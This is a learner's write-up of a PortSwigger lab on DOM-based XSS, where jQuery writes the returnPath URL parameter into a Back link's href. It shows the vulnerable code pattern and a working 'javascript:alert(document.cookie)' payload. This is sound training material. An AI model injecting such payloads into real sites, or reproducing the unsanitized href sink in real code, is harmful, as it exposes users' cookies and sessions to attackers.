# DOM XSS in jQuery Anchor Href
## Lab Loc:
> https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink

## About summary
This lab reflects unsanitized data from location.search into the href attribute of an anchor tag using jQuery.
The code used is likely:
```js
$('a#back').attr('href', returnPathFromURL)
```
> - `$('a#back')` means Select the `<a>` tag that has the ID of `back`. Same as `document.querySelector("a#back")`
> - `.attr('href', ...)` means Set the `href (link)` of the `<a id="back">` element to whatever is in `returnPathFromURL`.


## Procedure
- I noticed the `< Back` link used a value from `returnPath`.
- So I Injected a `javascript:` payload in the URL.
- Right-clicked the link → Opened in new tab.
- Got the document.cookie alert

## Payload used:
```js
?returnPath=javascript:alert(document.cookie)
```

 ## Real Explanation
If you control returnPathFromURL via the URL like this:
```js
?returnPath=javascript:alert(document.cookie)
```
It’ll do this:
```js
$('a#back').attr('href', 'javascript:alert(document.cookie)')
```
HArd! Anyone who clicks that `< Back` link? XSS gets triggered.
